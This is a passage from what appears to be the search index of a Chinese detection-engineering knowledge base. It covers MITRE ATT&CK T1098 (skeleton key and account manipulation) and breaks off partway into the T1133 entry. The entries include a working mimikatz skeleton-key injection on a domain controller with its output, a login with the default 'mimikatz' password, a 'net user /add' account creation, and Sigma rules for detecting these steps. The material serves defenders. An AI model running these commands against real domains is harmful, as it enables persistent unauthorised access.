\u5e10\u6237\u64cd\u4f5c\u53ef\u4ee5\u5e2e\u52a9\u653b\u51fb\u8005\u7ef4\u6301\u5728\u53d7\u5bb3\u8005\u73af\u5883\u4e2d\u5bf9\u51ed\u636e\u6216\u67d0\u4e9b\u6743\u9650\u7ea7\u522b\u7684\u8bbf\u95ee\u6743\u9650\u3002\u8d26\u6237\u64cd\u4f5c\u53ef\u80fd\u5305\u62ec\u4fee\u6539\u6743\u9650\uff0c\u4fee\u6539\u51ed\u636e\uff0c\u6dfb\u52a0\u6216\u66f4\u6539\u6743\u9650\u7ec4\uff0c\u4fee\u6539\u5e10\u6237\u8bbe\u7f6e\u6216\u4fee\u6539\u6267\u884c\u8eab\u4efd\u9a8c\u8bc1\u7b49\u65b9\u5f0f\u3002\u4e3a\u4e86\u521b\u5efa\u6216\u64cd\u7eb5\u5e10\u6237\uff0c\u653b\u51fb\u8005\u5fc5\u987b\u5df2\u7ecf\u5bf9\u7cfb\u7edf\u6216\u57df\u5177\u6709\u8db3\u591f\u7684\u6743\u9650\u3002 \u6d4b\u8bd5\u6848\u4f8b \u4f7f\u7528\u4e07\u80fd\u5bc6\u7801\uff08skeleton key\uff09\uff0c\u53ef\u4ee5\u5bf9\u57df\u5185\u6743\u9650\u8fdb\u884c\u6301\u4e45\u5316\u64cd\u4f5c\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 \u6b65\u9aa41\uff08PC\u4e0a\u6267\u884c\uff0c\u666e\u901a\u57df\u7528\u6237\u6743\u9650\uff09 C:\\Users\\xiaomi>dir \\\\dc.xiaomi.org\\c$ \u62d2\u7edd\u8bbf\u95ee\u3002 C:\\Users\\xiaomi>net use \\\\dc.xiaomi.org\\ipc$ \"admin.098\" /user:xiaomi\\administra tor \u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002 C:\\Users\\xiaomi>dir \\\\dc.xiaomi.org\\c$ \u9a71\u52a8\u5668 \\\\dc.xiaomi.org\\c$ \u4e2d\u7684\u5377\u6ca1\u6709\u6807\u7b7e\u3002 \u5377\u7684\u5e8f\u5217\u53f7\u662f 50E9-7D0C \\\\dc.xiaomi.org\\c$ \u7684\u76ee\u5f55 2009/07/14 11:20 <DIR> PerfLogs 2020/03/23 15:24 <DIR> Program Files 2020/03/23 15:24 <DIR> Program Files (x86) 2020/03/23 14:47 <DIR> Users 2020/03/23 15:30 <DIR> Windows 0 \u4e2a\u6587\u4ef6 0 \u5b57\u8282 5 \u4e2a\u76ee\u5f55 32,728,838,144 \u53ef\u7528\u5b57\u8282 C:\\Users\\xiaomi>net use \u4f1a\u8bb0\u5f55\u65b0\u7684\u7f51\u7edc\u8fde\u63a5\u3002 \u72b6\u6001 \u672c\u5730 \u8fdc\u7a0b \u7f51\u7edc ------------------------------------------------------------------------------- OK \\\\dc.xiaomi.org\\ipc$ Microsoft Windows Network \u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002 C:\\Users\\xiaomi>net use \\\\dc.xiaomi.org\\ipc$ /del /y \\\\dc.xiaomi.org\\ipc$ \u5df2\u7ecf\u5220\u9664\u3002 C:\\Users\\xiaomi>net use \u4f1a\u8bb0\u5f55\u65b0\u7684\u7f51\u7edc\u8fde\u63a5\u3002 \u5217\u8868\u662f\u7a7a\u7684\u3002 \u6b65\u9aa42\uff08DC\u4e0a\u6267\u884c\uff0c\u7ba1\u7406\u5458\u6743\u9650\uff09 C:\\Users\\Administrator\\Desktop\\mimikatz_trunk\\x64>mimikatz.exe \"privilege::debug \" \"misc::skeleton\" exit .#####. mimikatz 2.1.1 (x64) built on Apr 9 2017 23:24:20 .## ^ ##. \"A La Vie, A L'Amour\" ## / \\ ## /* * * ## \\ / ## Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) '## v ##' http://blog.gentilkiwi.com/mimikatz (oe.eo) '#####' with 21 modules * * */ mimikatz(commandline) # privilege::debug Privilege '20' OK mimikatz(commandline) # misc::skeleton [KDC] data [KDC] struct [KDC] keys patch OK [RC4] functions [RC4] init patch OK [RC4] decrypt patch OK mimikatz(commandline) # exit Bye! \u7cfb\u7edf\u63d0\u793aSkeleton Key\u5df2\u7ecf\u6ce8\u5165\u6210\u529f\u3002\u6b64\u65f6\uff0c\u4f1a\u5728\u57df\u5185\u7684\u6240\u6709\u8d26\u6237\u4e2d\u6dfb\u52a0\u4e00\u4e2aSkeleton key\uff0c\u5176\u5bc6\u7801\u9ed8\u8ba4\u4e3a\u201cmimikatz\u201d\u3002\u63a5\u4e0b\u6765\u53ef\u4ee5\u4ee5\u57df\u5185\u4efb\u4f55\u7528\u6237\u7684\u8eab\u4efd\uff0c\u914d\u5408\u8be5Skeleton Key\uff0c\u8fdb\u884c\u57df\u5185\u8eab\u4efd\u6388\u6743\u9a8c\u8bc1\u4e86\u3002 \u6b65\u9aa43\uff08PC\u4e0a\u6267\u884c\uff0c\u666e\u901a\u57df\u7528\u6237\u6743\u9650\uff09 C:\\Users\\xiaomi>net use \\\\dc.xiaomi.org\\ipc$ \"mimikatz\" /user:xiaomi\\administrat or \u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002 C:\\Users\\xiaomi>dir \\\\dc.xiaomi.org\\c$ \u9a71\u52a8\u5668 \\\\dc.xiaomi.org\\c$ \u4e2d\u7684\u5377\u6ca1\u6709\u6807\u7b7e\u3002 \u5377\u7684\u5e8f\u5217\u53f7\u662f 50E9-7D0C \\\\dc.xiaomi.org\\c$ \u7684\u76ee\u5f55 2009/07/14 11:20 <DIR> PerfLogs 2020/03/23 15:24 <DIR> Program Files 2020/03/23 15:24 <DIR> Program Files (x86) 2020/03/23 14:47 <DIR> Users 2020/03/23 15:30 <DIR> Windows 0 \u4e2a\u6587\u4ef6 0 \u5b57\u8282 5 \u4e2a\u76ee\u5f55 32,758,198,272 \u53ef\u7528\u5b57\u8282 \u6d4b\u8bd5\u7559\u75d5 windows\u5b89\u5168\u4e8b\u4ef6ID\uff0c\u591a\u4e8b\u4ef6\u5173\u8054\u5206\u6790 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def Sigma\u89c4\u5219 title: Windows \u4e07\u80fd\u5bc6\u7801 description: Windows server 2008 R2\\win 7 references: https://0xsp.com/ad-attack-or-defense/ad-ttps-list tags: T1098 status: \u6d4b\u8bd5\u9636\u6bb5 author: 12306Bro logsource: product: windows service: security detection: selection1: EventID: 4673 #\u8c03\u7528\u6743\u9650\u7684\u670d\u52a1 selection2: EventID: 4611 #\u53d7\u4fe1\u4efb\u7684\u767b\u5f55\u8fdb\u7a0b\u5df2\u5728\u672c\u5730\u5b89\u5168\u673a\u6784\u6ce8\u518c selection3: EventID: 4688 #\u65b0\u8fdb\u7a0b\u521b\u5efa selection4: EventID: 4689 #\u9000\u51fa\u8fdb\u7a0b condition: all of them timeframe: last 5s level: medium \u5efa\u8bae \u4ee5\u4e0a\u89c4\u5219\u5b58\u5728\u4e00\u5b9a\u7a0b\u5ea6\u7684\u4e0d\u7a33\u5b9a\u6027\uff0c\u8c28\u614e\u4f7f\u7528\uff01 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1098 https://attack.mitre.org/techniques/T1098/","title":"T1098-win-\u4e07\u80fd\u5bc6\u7801"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#t1098-win-","text":"","title":"T1098-win-\u4e07\u80fd\u5bc6\u7801"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#attck","text":"\u5e10\u6237\u64cd\u4f5c\u53ef\u4ee5\u5e2e\u52a9\u653b\u51fb\u8005\u7ef4\u6301\u5728\u53d7\u5bb3\u8005\u73af\u5883\u4e2d\u5bf9\u51ed\u636e\u6216\u67d0\u4e9b\u6743\u9650\u7ea7\u522b\u7684\u8bbf\u95ee\u6743\u9650\u3002\u8d26\u6237\u64cd\u4f5c\u53ef\u80fd\u5305\u62ec\u4fee\u6539\u6743\u9650\uff0c\u4fee\u6539\u51ed\u636e\uff0c\u6dfb\u52a0\u6216\u66f4\u6539\u6743\u9650\u7ec4\uff0c\u4fee\u6539\u5e10\u6237\u8bbe\u7f6e\u6216\u4fee\u6539\u6267\u884c\u8eab\u4efd\u9a8c\u8bc1\u7b49\u65b9\u5f0f\u3002\u4e3a\u4e86\u521b\u5efa\u6216\u64cd\u7eb5\u5e10\u6237\uff0c\u653b\u51fb\u8005\u5fc5\u987b\u5df2\u7ecf\u5bf9\u7cfb\u7edf\u6216\u57df\u5177\u6709\u8db3\u591f\u7684\u6743\u9650\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#_1","text":"\u4f7f\u7528\u4e07\u80fd\u5bc6\u7801\uff08skeleton key\uff09\uff0c\u53ef\u4ee5\u5bf9\u57df\u5185\u6743\u9650\u8fdb\u884c\u6301\u4e45\u5316\u64cd\u4f5c\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#_3","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#1pc","text":"C:\\Users\\xiaomi>dir \\\\dc.xiaomi.org\\c$ \u62d2\u7edd\u8bbf\u95ee\u3002 C:\\Users\\xiaomi>net use \\\\dc.xiaomi.org\\ipc$ \"admin.098\" /user:xiaomi\\administra tor \u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002 C:\\Users\\xiaomi>dir \\\\dc.xiaomi.org\\c$ \u9a71\u52a8\u5668 \\\\dc.xiaomi.org\\c$ \u4e2d\u7684\u5377\u6ca1\u6709\u6807\u7b7e\u3002 \u5377\u7684\u5e8f\u5217\u53f7\u662f 50E9-7D0C \\\\dc.xiaomi.org\\c$ \u7684\u76ee\u5f55 2009/07/14 11:20 <DIR> PerfLogs 2020/03/23 15:24 <DIR> Program Files 2020/03/23 15:24 <DIR> Program Files (x86) 2020/03/23 14:47 <DIR> Users 2020/03/23 15:30 <DIR> Windows 0 \u4e2a\u6587\u4ef6 0 \u5b57\u8282 5 \u4e2a\u76ee\u5f55 32,728,838,144 \u53ef\u7528\u5b57\u8282 C:\\Users\\xiaomi>net use \u4f1a\u8bb0\u5f55\u65b0\u7684\u7f51\u7edc\u8fde\u63a5\u3002 \u72b6\u6001 \u672c\u5730 \u8fdc\u7a0b \u7f51\u7edc ------------------------------------------------------------------------------- OK \\\\dc.xiaomi.org\\ipc$ Microsoft Windows Network \u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002 C:\\Users\\xiaomi>net use \\\\dc.xiaomi.org\\ipc$ /del /y \\\\dc.xiaomi.org\\ipc$ \u5df2\u7ecf\u5220\u9664\u3002 C:\\Users\\xiaomi>net use \u4f1a\u8bb0\u5f55\u65b0\u7684\u7f51\u7edc\u8fde\u63a5\u3002 \u5217\u8868\u662f\u7a7a\u7684\u3002","title":"\u6b65\u9aa41\uff08PC\u4e0a\u6267\u884c\uff0c\u666e\u901a\u57df\u7528\u6237\u6743\u9650\uff09"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#2dc","text":"C:\\Users\\Administrator\\Desktop\\mimikatz_trunk\\x64>mimikatz.exe \"privilege::debug \" \"misc::skeleton\" exit .#####. mimikatz 2.1.1 (x64) built on Apr 9 2017 23:24:20 .## ^ ##. \"A La Vie, A L'Amour\" ## / \\ ## /* * * ## \\ / ## Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) '## v ##' http://blog.gentilkiwi.com/mimikatz (oe.eo) '#####' with 21 modules * * */ mimikatz(commandline) # privilege::debug Privilege '20' OK mimikatz(commandline) # misc::skeleton [KDC] data [KDC] struct [KDC] keys patch OK [RC4] functions [RC4] init patch OK [RC4] decrypt patch OK mimikatz(commandline) # exit Bye! \u7cfb\u7edf\u63d0\u793aSkeleton Key\u5df2\u7ecf\u6ce8\u5165\u6210\u529f\u3002\u6b64\u65f6\uff0c\u4f1a\u5728\u57df\u5185\u7684\u6240\u6709\u8d26\u6237\u4e2d\u6dfb\u52a0\u4e00\u4e2aSkeleton key\uff0c\u5176\u5bc6\u7801\u9ed8\u8ba4\u4e3a\u201cmimikatz\u201d\u3002\u63a5\u4e0b\u6765\u53ef\u4ee5\u4ee5\u57df\u5185\u4efb\u4f55\u7528\u6237\u7684\u8eab\u4efd\uff0c\u914d\u5408\u8be5Skeleton Key\uff0c\u8fdb\u884c\u57df\u5185\u8eab\u4efd\u6388\u6743\u9a8c\u8bc1\u4e86\u3002","title":"\u6b65\u9aa42\uff08DC\u4e0a\u6267\u884c\uff0c\u7ba1\u7406\u5458\u6743\u9650\uff09"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#3pc","text":"C:\\Users\\xiaomi>net use \\\\dc.xiaomi.org\\ipc$ \"mimikatz\" /user:xiaomi\\administrat or \u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002 C:\\Users\\xiaomi>dir \\\\dc.xiaomi.org\\c$ \u9a71\u52a8\u5668 \\\\dc.xiaomi.org\\c$ \u4e2d\u7684\u5377\u6ca1\u6709\u6807\u7b7e\u3002 \u5377\u7684\u5e8f\u5217\u53f7\u662f 50E9-7D0C \\\\dc.xiaomi.org\\c$ \u7684\u76ee\u5f55 2009/07/14 11:20 <DIR> PerfLogs 2020/03/23 15:24 <DIR> Program Files 2020/03/23 15:24 <DIR> Program Files (x86) 2020/03/23 14:47 <DIR> Users 2020/03/23 15:30 <DIR> Windows 0 \u4e2a\u6587\u4ef6 0 \u5b57\u8282 5 \u4e2a\u76ee\u5f55 32,758,198,272 \u53ef\u7528\u5b57\u8282","title":"\u6b65\u9aa43\uff08PC\u4e0a\u6267\u884c\uff0c\u666e\u901a\u57df\u7528\u6237\u6743\u9650\uff09"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#_4","text":"windows\u5b89\u5168\u4e8b\u4ef6ID\uff0c\u591a\u4e8b\u4ef6\u5173\u8054\u5206\u6790","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#sigma","text":"title: Windows \u4e07\u80fd\u5bc6\u7801 description: Windows server 2008 R2\\win 7 references: https://0xsp.com/ad-attack-or-defense/ad-ttps-list tags: T1098 status: \u6d4b\u8bd5\u9636\u6bb5 author: 12306Bro logsource: product: windows service: security detection: selection1: EventID: 4673 #\u8c03\u7528\u6743\u9650\u7684\u670d\u52a1 selection2: EventID: 4611 #\u53d7\u4fe1\u4efb\u7684\u767b\u5f55\u8fdb\u7a0b\u5df2\u5728\u672c\u5730\u5b89\u5168\u673a\u6784\u6ce8\u518c selection3: EventID: 4688 #\u65b0\u8fdb\u7a0b\u521b\u5efa selection4: EventID: 4689 #\u9000\u51fa\u8fdb\u7a0b condition: all of them timeframe: last 5s level: medium","title":"Sigma\u89c4\u5219"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#_6","text":"\u4ee5\u4e0a\u89c4\u5219\u5b58\u5728\u4e00\u5b9a\u7a0b\u5ea6\u7684\u4e0d\u7a33\u5b9a\u6027\uff0c\u8c28\u614e\u4f7f\u7528\uff01","title":"\u5efa\u8bae"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81/#_7","text":"MITRE-ATT&CK-T1098 https://attack.mitre.org/techniques/T1098/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-%E8%B4%A6%E6%88%B7%E6%93%8D%E4%BD%9C/","text":"T1098-win-\u8d26\u6237\u64cd\u4f5c \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u5e10\u6237\u64cd\u4f5c\u53ef\u4ee5\u5e2e\u52a9\u653b\u51fb\u8005\u7ef4\u6301\u5728\u73af\u5883\u4e2d\u5bf9\u51ed\u636e\u548c\u67d0\u4e9b\u6743\u9650\u7ea7\u522b\u7684\u8bbf\u95ee\u3002\u8d26\u6237\u64cd\u4f5c\u53ef\u80fd\u5305\u62ec\u4fee\u6539\u6743\u9650\uff0c\u4fee\u6539\u51ed\u636e\uff0c\u6dfb\u52a0\u6216\u66f4\u6539\u6743\u9650\u7ec4\uff0c\u4fee\u6539\u5e10\u6237\u8bbe\u7f6e\u6216\u4fee\u6539\u6267\u884c\u8eab\u4efd\u9a8c\u8bc1\u7b49\u65b9\u5f0f\u3002\u4e3a\u4e86\u521b\u5efa\u6216\u64cd\u7eb5\u5e10\u6237\uff0c\u653b\u51fb\u8005\u5fc5\u987b\u5df2\u7ecf\u5bf9\u7cfb\u7edf\u6216\u57df\u5177\u6709\u8db3\u591f\u7684\u6743\u9650\u3002 \u6d4b\u8bd5\u6848\u4f8b \u4f7f\u7528windows\u7cfb\u7edf\u81ea\u8eab\u7684\u4e00\u4e9b\u5b89\u5168\u8fdb\u7a0b\uff08CMD/Powershell\u7b49\uff09\u6765\u6267\u884c\u8fd9\u4e9b\u64cd\u4f5c\uff0c\u4e5f\u53ef\u4ee5\u5229\u7528\u4e00\u4e9b\u7ecf\u5178\u7684\u5de5\u5177\u6765\u8fdb\u884c\u8d26\u6237\u64cd\u4f5c\uff08mimikatz\u7b49\uff09\u3002\u524d\u63d0\u662f\u4f60\u5df2\u7ecf\u5bf9\u7cfb\u7edf\u6216\u8005\u57df\u5177\u6709\u8db3\u591f\u7684\u6743\u9650\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 C:\\Windows\\system32>net user test321 Test.321 /add \u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002 \u6d4b\u8bd5\u7559\u75d5 windows\u5b89\u5168\u4e8b\u4ef6ID\uff0c\u591a\u4e8b\u4ef6\u5173\u8054\u5206\u6790 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def Sigma\u89c4\u5219 title: Net.exe\u521b\u5efa\u672c\u5730\u7528\u6237 status: \u6d4b\u8bd5\u9636\u6bb5 description: \u901a\u8fc7\u521b\u5efa\u672c\u5730\u7528\u6237net.exe\u6587\u4ef6\u547d\u4ee4 tags: - attack.t1098 logsource: category: process_creation product: windows detection: selection: Eventid: - 4688 #\u8fdb\u7a0b\u521b\u5efa\uff0cwindows \u5b89\u5168\u65e5\u5fd7\uff0cWindows server 2012\u53ca\u4ee5\u4e0a\u7248\u672c\u914d\u7f6e\u76f8\u5173\u5ba1\u6838\u7b56\u7565\uff0c\u53ef\u8bb0\u5f55\u7cfb\u7edf\u547d\u4ee4\u884c\u53c2\u6570 - 1 #\u8fdb\u7a0b\u521b\u5efa\uff0cWindows sysmon\u65e5\u5fd7\uff0c\u9700\u8981\u81ea\u884c\u5b89\u88c5\u5e76\u914d\u7f6esysmon Image|endswith: - '\\net.exe' - '\\net1.exe' CommandLine|contains|all: - 'user' - 'add' condition: selection fields: - ComputerName - User - CommandLine falsepositives: - Legit user creation - Better use event ids for user creation rather than command line rules level: medium \u5efa\u8bae \u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1098 https://attack.mitre.org/techniques/T1098/","title":"T1098-win-\u8d26\u6237\u64cd\u4f5c"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-%E8%B4%A6%E6%88%B7%E6%93%8D%E4%BD%9C/#t1098-win-","text":"","title":"T1098-win-\u8d26\u6237\u64cd\u4f5c"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-%E8%B4%A6%E6%88%B7%E6%93%8D%E4%BD%9C/#attck","text":"\u5e10\u6237\u64cd\u4f5c\u53ef\u4ee5\u5e2e\u52a9\u653b\u51fb\u8005\u7ef4\u6301\u5728\u73af\u5883\u4e2d\u5bf9\u51ed\u636e\u548c\u67d0\u4e9b\u6743\u9650\u7ea7\u522b\u7684\u8bbf\u95ee\u3002\u8d26\u6237\u64cd\u4f5c\u53ef\u80fd\u5305\u62ec\u4fee\u6539\u6743\u9650\uff0c\u4fee\u6539\u51ed\u636e\uff0c\u6dfb\u52a0\u6216\u66f4\u6539\u6743\u9650\u7ec4\uff0c\u4fee\u6539\u5e10\u6237\u8bbe\u7f6e\u6216\u4fee\u6539\u6267\u884c\u8eab\u4efd\u9a8c\u8bc1\u7b49\u65b9\u5f0f\u3002\u4e3a\u4e86\u521b\u5efa\u6216\u64cd\u7eb5\u5e10\u6237\uff0c\u653b\u51fb\u8005\u5fc5\u987b\u5df2\u7ecf\u5bf9\u7cfb\u7edf\u6216\u57df\u5177\u6709\u8db3\u591f\u7684\u6743\u9650\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-%E8%B4%A6%E6%88%B7%E6%93%8D%E4%BD%9C/#_1","text":"\u4f7f\u7528windows\u7cfb\u7edf\u81ea\u8eab\u7684\u4e00\u4e9b\u5b89\u5168\u8fdb\u7a0b\uff08CMD/Powershell\u7b49\uff09\u6765\u6267\u884c\u8fd9\u4e9b\u64cd\u4f5c\uff0c\u4e5f\u53ef\u4ee5\u5229\u7528\u4e00\u4e9b\u7ecf\u5178\u7684\u5de5\u5177\u6765\u8fdb\u884c\u8d26\u6237\u64cd\u4f5c\uff08mimikatz\u7b49\uff09\u3002\u524d\u63d0\u662f\u4f60\u5df2\u7ecf\u5bf9\u7cfb\u7edf\u6216\u8005\u57df\u5177\u6709\u8db3\u591f\u7684\u6743\u9650\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-%E8%B4%A6%E6%88%B7%E6%93%8D%E4%BD%9C/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-%E8%B4%A6%E6%88%B7%E6%93%8D%E4%BD%9C/#_3","text":"C:\\Windows\\system32>net user test321 Test.321 /add \u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-%E8%B4%A6%E6%88%B7%E6%93%8D%E4%BD%9C/#_4","text":"windows\u5b89\u5168\u4e8b\u4ef6ID\uff0c\u591a\u4e8b\u4ef6\u5173\u8054\u5206\u6790","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-%E8%B4%A6%E6%88%B7%E6%93%8D%E4%BD%9C/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-%E8%B4%A6%E6%88%B7%E6%93%8D%E4%BD%9C/#sigma","text":"title: Net.exe\u521b\u5efa\u672c\u5730\u7528\u6237 status: \u6d4b\u8bd5\u9636\u6bb5 description: \u901a\u8fc7\u521b\u5efa\u672c\u5730\u7528\u6237net.exe\u6587\u4ef6\u547d\u4ee4 tags: - attack.t1098 logsource: category: process_creation product: windows detection: selection: Eventid: - 4688 #\u8fdb\u7a0b\u521b\u5efa\uff0cwindows \u5b89\u5168\u65e5\u5fd7\uff0cWindows server 2012\u53ca\u4ee5\u4e0a\u7248\u672c\u914d\u7f6e\u76f8\u5173\u5ba1\u6838\u7b56\u7565\uff0c\u53ef\u8bb0\u5f55\u7cfb\u7edf\u547d\u4ee4\u884c\u53c2\u6570 - 1 #\u8fdb\u7a0b\u521b\u5efa\uff0cWindows sysmon\u65e5\u5fd7\uff0c\u9700\u8981\u81ea\u884c\u5b89\u88c5\u5e76\u914d\u7f6esysmon Image|endswith: - '\\net.exe' - '\\net1.exe' CommandLine|contains|all: - 'user' - 'add' condition: selection fields: - ComputerName - User - CommandLine falsepositives: - Legit user creation - Better use event ids for user creation rather than command line rules level: medium","title":"Sigma\u89c4\u5219"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-%E8%B4%A6%E6%88%B7%E6%93%8D%E4%BD%9C/#_6","text":"\u65e0","title":"\u5efa\u8bae"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1098-win-%E8%B4%A6%E6%88%B7%E6%93%8D%E4%BD%9C/#_7","text":"MITRE-ATT&CK-T1098 https://attack.mitre.org/techniques/T1098/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1133-%E5%A4%96%E9%83%A8%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1/","text":"T1133-\u5916\u90e8\u8fdc\u7a0b\u670d\u52a1 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 VPN\uff0cCitrix\u548c\u5176\u4ed6\u8bbf\u95ee\u673a\u5236\u7b49\u8fdc\u7a0b\u670d\u52a1\u4f7f\u7528\u6237\u53ef\u4ee5\u4ece\u5916\u90e8\u4f4d\u7f6e\u8fde\u63a5\u5230\u5185\u90e8\u4f01\u4e1a\u7f51\u7edc\u8d44\u6e90\u3002\u7ecf\u5e38\u6709\u8fdc\u7a0b\u670d\u52a1\u7f51\u5173\u7ba1\u7406\u8fd9\u4e9b\u670d\u52a1\u7684\u8fde\u63a5\u548c\u51ed\u636e\u8eab\u4efd\u9a8c\u8bc1\u3002Windows Remote Management\u7b49\u670d\u52a1\u4e5f\u53ef\u4ee5\u5728\u5916\u90e8\u4f7f\u7528\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u8fdc\u7a0b\u670d\u52a1\u6765\u83b7\u5f97\u521d\u59cb\u8bbf\u95ee\u6743\u9650\uff0c\u4e5f\u53ef\u4ee5\u7528\u4f5c\u5728\u7f51\u5185\u7528\u4f5c\u6301\u4e45\u5316\u3002\u901a\u5e38\u9700\u8981\u8bbf\u95ee\u6709\u6548\u5e10\u6237\u624d\u80fd\u4f7f\u7528\u8be5\u670d\u52a1\uff0c\u53ef\u4ee5\u901a\u8fc7\u51ed\u636e\u7be1\u6539\u6216\u5728\u8fdb\u5165\u4f01\u4e1a\u7f51\u7edc\u4e4b\u540e\u4ece\u7528\u6237\u90a3\u91cc\u83b7\u53d6\u51ed\u636e\u6765\u83b7\u5f97\u6b64\u6743\u9650\u3002\u5728\u64cd\u4f5c\u8fc7\u7a0b\u4e2d\uff0c\u53ef\u4ee5\u5c06\u5bf9\u8fdc\u7a0b\u670d\u52a1\u7684\u8bbf\u95ee\u7528\u4f5c\u5197\u4f59\u8bbf\u95ee\u7684\u4e00\u90e8\u5206\u3002 \u6d4b\u8bd5\u6848\u4f8b \u6309\u7167MITRE\u5b98\u65b9\u793a\u4f8b\uff0c\u50cfVPN\u3001\u8fdc\u7a0b\u684c\u9762\u3001SSH\u7b49\u90fd\u53ef\u4ee5\u5c5e\u4e8eT1133\u5916\u90e8\u8fdc\u7a0b\u8bbf\u95ee\u3002 \u68c0\u6d4b\u65e5\u5fd7 SSH\u65e5\u5fd7\u3001VPN\u65e5\u5fd7\u3001\u8fdc\u7a0b\u684c\u9762\u767b\u5f55\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 \u6682\u65e0 \u6d4b\u8bd5\u7559\u75d5 \u6682\u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def 